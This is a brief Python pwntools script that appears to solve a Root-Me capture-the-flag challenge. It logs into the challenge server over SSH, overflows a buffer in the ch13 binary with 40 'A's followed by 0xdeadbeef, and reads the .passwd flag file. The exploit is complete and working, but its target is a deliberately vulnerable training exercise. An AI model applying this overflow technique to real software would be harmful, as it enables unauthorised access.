# pwning
from pwn import *
p = ssh(host='challenge02.root-me.org',user='app-systeme-ch13',password='app-systeme-ch13',port=2222)
print p['ls']
ch13=p.process('./ch13')

ch13.sendline('A'*40 + '\xef\xbe\xad\xde')
ch13.interactive()

print p['cat .passwd']
